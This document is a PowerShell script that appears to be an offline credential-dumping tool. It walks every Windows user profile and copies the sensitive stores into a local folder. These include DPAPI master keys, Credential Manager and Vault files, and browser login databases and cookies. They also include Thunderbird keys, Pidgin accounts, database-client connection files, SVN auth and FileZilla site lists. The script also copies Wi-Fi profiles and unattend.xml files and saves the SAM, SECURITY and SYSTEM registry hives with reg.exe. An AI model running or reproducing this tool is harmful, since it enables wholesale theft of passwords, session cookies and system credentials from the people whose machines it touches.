
function CheckFiles($dst, $user, $d) 
{
	for ($i=0; $i -lt $d['paths'].length; $i++) {
		
		$path = $d['paths'][$i].replace('[USER]', $user)
		# Do not create a directory if no configuration files have been found
		if ((Test-Path $path))
		{
			if (!(Test-Path $dst))
			{
				CreateDir($dst)
			}
			CopyFile $path $dst
		}
	}
}

# manage multiple profiles
function ManageMozilla($root, $user, $d){
	$mozilla_software_path = $d['paths'].replace('[USER]', $user)

	if (Test-Path $mozilla_software_path) {
		$mozilla_folder = $root + '\' + $d['name']
		CreateDir($mozilla_folder)

		$profiles = Get-ChildItem -Path $mozilla_software_path
		foreach ($profile in $profiles.Name)
		{
			$profile_folder = $mozilla_folder + '\' + $profile
			CreateDir($profile_folder)
			for ($i=0; $i -lt $d['files'].length; $i++) {
				$path = $d['paths'].replace('[USER]', $user) + '\' + $profile + '\' + $d['files'][$i]
				$dst = $profile_folder + '\' + $d['files'][$i]

				CopyFile $path $dst
			}
		}
	}
}

# for Chrome and some browsers
function ManageChromeProfile($root, $user, $d)
{

	$chrome_software_path = $d['paths'].replace('[USER]', $user)

	if (Test-Path $chrome_software_path) {
		$chrome_folder = $root + '\' + $d['name']
		CreateDir($mozilla_folder)

		$profiles = Get-ChildItem -Path $chrome_software_path
		foreach ($profile in $profiles.Name)
		{
			$profile_folder = $chrome_folder + '\' + $profile
			CreateDir($profile_folder)
			for ($i=0; $i -lt $d['files'].length; $i++) {
				$path = $d['paths'].replace('[USER]', $user) + '\' + $profile + '\' + $d['files'][$i]
				$dst = $profile_folder + '\' + $d['files'][$i]

				CopyFile $path $dst
			}
		}
	}
}

function CopyFile($path, $dst){
	if (Test-Path $path) {
		if ((Get-Item $path) -is [System.IO.DirectoryInfo])
		{
			# Directory
			Copy-Item -Recurse -Path $path -Destination $dst
		}
		else
		{
			# File
			Copy-Item -Path $path -Destination $dst
		}
	}
}

function CreateDir($path){
	If(!(Test-Path $path))
	{
		$new_dir = New-Item -ItemType Directory -Force -Path $path
	}
}

function SaveHives($hives_folder)
{
	CreateDir($hives_folder)
	$dst = $hives_folder + '\SAM'
	$sam = reg.exe save hklm\sam $dst 
	
	$dst = $hives_folder + '\SECURITY'
	$secu = reg.exe save hklm\security $dst 
	
	$dst = $hives_folder + '\SYSTEM'
	$sys = reg.exe save hklm\system $dst 
}


function Dump
{	
<#
	.PARAMETER Out
		Specify the name of the directory where all files will be copied (default: dump)
	
	.EXAMPLE
		PS C:\> Dump

	.EXAMPLE
		PS C:\> Dump -Out dump
#>
	
	Param(
        [Parameter(Mandatory = $False)]
        [String]
		$Out = 'dump'
	)

	$usersFolder 	= $Out + '\Users'
	$systemFolder	= $Out + '\System'
	$users 			= Get-ChildItem -Path C:\Users
	
	CreateDir($Out)
	CreateDir($usersFolder)
	CreateDir($systemFolder)

	######################################### User softwares #########################################

	##################### DPAPI ####################

	$dpapi_roaming = @{
			'name' 		= 'DPAPI'
			'subfolder' = 'Roaming'
			'paths' 	= @(
								'C:\Users\[USER]\AppData\Roaming\Microsoft\Protect',
								'C:\Users\[USER]\AppData\Roaming\Microsoft\Credentials',
								'C:\Users\[USER]\AppData\Roaming\Microsoft\Vault'
							)
	}

	$dpapi_local = @{
			'name' 		= 'DPAPI'
			'subfolder' = 'Local'
			'paths' 	= @(
								'C:\Users\[USER]\AppData\Local\Microsoft\Credentials',
								'C:\Users\[USER]\AppData\Local\Microsoft\Vault'
							)
	}

	##################### Browsers ####################
		
	$firefox = @{
			'name' 	= 'Firefox'
			'paths'	= @('C:\Users\[USER]\AppData\Roaming\Mozilla\Firefox\Profiles')
			'files' = @(
							'key4.db',
							'key3.db',
							'logins.json',
							'cert8.db',
							'cookies.sqlite'
						)
	}

	$chrome = @{
			'name' 	= 'Chrome'
			'paths'	= @('C:\Users\[USER]\AppData\Local\Google\Chrome\User Data')
			'files' = @(
							'Login Data',
							'Cookies'
						)
	}

	$coccoc = @{
			'name' 	= 'Coccoc'
			'paths'	= @('C:\Users\[USER]\AppData\Local\CocCoc\Browser\User Data')
			'files' 	= 'Login Data'
	}

	$opera = @{
			'name' 	= 'Opera'
			'paths'	= @('C:\Users\[USER]\AppData\Roaming\Opera Software\Opera Stable\Login Data')
	}


	##################### Chats ####################

	$pidgin = @{
			'name' 	= 'Pidgin'
			'paths'	= @('C:\Users\[USER]\AppData\Roaming\.purple\accounts.xml')
	}

	##################### Databases #####################

	$dbvis = @{
			'name' 	= 'Dbvis'
			'paths'	= @('C:\Users\[USER]\.dbvis\config70\dbvis.xml')
	}

	$robomongo = @{
			'name' 	= 'Robomongo'
			'paths'	= @(
							'C:\Users\[USER]\.config\Robomongo\robomongo.json',
							'C:\Users\[USER]\.3T\robo-3t\1.1.1\robo3t.json'
						)
	}

	$squirrel = @{
			'name' 	= 'Squirrel'
			'paths'	= @('C:\Users\[USER]\.squirrel-sql\SQLAliases23.xml')
	}

	$sqlDeveloper = @{
			'name' 	= 'SQL Developer'
			'paths'	= @('C:\Users\[USER]\AppData\Roaming\SQL Developer')
			'files'	= @(
							'product-preferences.xml',
							'connections.xml'
						)
	}


	##################### Mails #####################

	$thunderbird = @{
			'name' 	= 'Thunderbird'
			'paths'	= @('C:\Users\[USER]\AppData\Roaming\Thunderbird\Profiles')
			'files' = @(
							'key3.db',
							'logins.json',
							'cert8.db'
						)
	}

	##################### SVN #####################

	$tortoise = @{
			'name' 	= 'Tortoise'
			'paths'	= @('C:\Users\[USER]\AppData\Roaming\Subversion\auth\svn.simple')
	}

	##################### Sysadmin #####################

	$apacheDirectoryStudio = @{
			'name' 	= 'ApacheDirectoryStudio'
			'paths'	= @('C:\Users\[USER]\.ApacheDirectoryStudio\.metadata\.plugins\org.apache.directory.studio.connection.core\connections.xml')
	}

	$filezilla = @{
			'name' 	= 'Filezilla'
			'paths'	= @(
							'C:\Users\[USER]\AppData\Roaming\FileZilla\sitemanager.xml', 
							'C:\Users\[USER]\AppData\Roaming\FileZilla\recentservers.xml', 
							'C:\Users\[USER]\AppData\Roaming\FileZilla\filezilla.xml'
						)
	}

	$ftpNavigator = @{
			'name' 	= 'FTP Navigator'
			'paths'	= @('C:\FTP Navigator\Ftplist.txt')
	}

	
	# Loop through all users 
	foreach ($user in $users.Name)
	{
		if ($user -ne "Public"){
			$userFolder = $usersFolder + '\' + $user
			CreateDir($userFolder)

			# --- DPAPI ---
			$dpapi_folder = $userFolder + '\' + $dpapi_roaming['name']
			CreateDir($dpapi_folder)

			$dpapi_roaming_folder = $dpapi_folder + '\' + $dpapi_roaming['subfolder'].replace('[USER]', $user)
			CreateDir($dpapi_roaming_folder)
			CheckFiles $dpapi_roaming_folder $user $dpapi_roaming

			$dpapi_local_folder = $dpapi_folder + '\' + $dpapi_local['subfolder'].replace('[USER]', $user)
			CreateDir($dpapi_local_folder)
			CheckFiles $dpapi_local_folder $user $dpapi_local			

			# --- Browsers ---
			ManageMozilla $userFolder $user $firefox
			ManageChromeProfile $userFolder $user $chrome
			ManageChromeProfile $userFolder $user $coccoc

			$dst = $userFolder + '\' + $opera['name']
			CheckFiles $dst $user $opera

			# --- Chats ---
			$dst = $userFolder + '\' + $pidgin['name']
			CheckFiles $dst $user $pidgin

			# --- Databases ---
			$dst = $userFolder + '\' + $dbvis['name']
			CheckFiles $dst $user $dbvis
			
			$dst = $userFolder + '\' + $robomongo['name']
			CheckFiles $dst $user $robomongo

			$dst = $userFolder + '\' + $squirrel['name']
			CheckFiles $dst $user $squirrel

			# Manage SQL Developer
			foreach ($files in $sqlDeveloper['files'])
			{
				$paths 	= Get-ChildItem -Path $sqlDeveloper['paths'].replace('[USER]', $user) -Filter $files -Recurse -ErrorAction SilentlyContinue -Force
				If ($paths -ne $null){
					$sqldev_folder = $userFolder + '\' + $sqlDeveloper['name']
					CreateDir($sqldev_folder)
					foreach ($p in $paths.FullName)
					{
						CopyFile $p $sqldev_folder
					}
				}
			}

			# --- Mail ---
			ManageMozilla $userFolder $user $thunderbird

			# --- Svn ---
			$dst = $userFolder + '\' + $tortoise['name']
			CheckFiles $dst $user $tortoise
			
			# --- Sysadmin ---
			$dst = $userFolder + '\' + $apacheDirectoryStudio['name']
			CheckFiles $dst $user $apacheDirectoryStudio

			$dst = $userFolder + '\' + $filezilla['name']
			CheckFiles $dst $user $filezilla

			$dst = $userFolder + '\' + $ftpNavigator['name']
			CheckFiles $dst $user $ftpNavigator
		}
	}

	######################################### System passwords #########################################

	##################### DPAPI ####################

	$dpapi_system = @{
			'name' 		= 'DPAPI'
			'paths' 	= @(
								'C:\Windows\System32\Microsoft\Protect',
								'C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Vault'
							)
	}

	$unattended = @{
			'name' 		= 'Unattended'
			'paths' 	= @(
								'C:\Windows\Panther\Unattend.xml', 
								'C:\Windows\Panther\Unattended.xml',
								'C:\Windows\Panther\Unattend\Unattended.xml',
								'C:\Windows\Panther\Unattend\Unattend.xml',
								'C:\Windows\System32\Sysprep\unattend.xml',
								'C:\Windows\System32\Sysprep\Panther\unattend.xml'
							)
	}

	$wifi = @{
			'name' 		= 'Wifi'
			'paths' 	= @(
								'C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces'
							)
	}

	# --- DPAPI ---
	$dst = $systemFolder + '\' + $dpapi_system['name']
	CheckFiles $dst '' $dpapi_system

	# --- Unattended ---
	$dst = $systemFolder + '\' + $unattended['name']
	CheckFiles $dst '' $unattended

	# --- Wifi ---
	$dst = $systemFolder + '\' + $wifi['name']
	CheckFiles $dst '' $wifi

	# saves system hives from registry
	SaveHives($systemFolder + '\' + 'Hives')

	"Folder " + $Out + " created successfully !"
}	
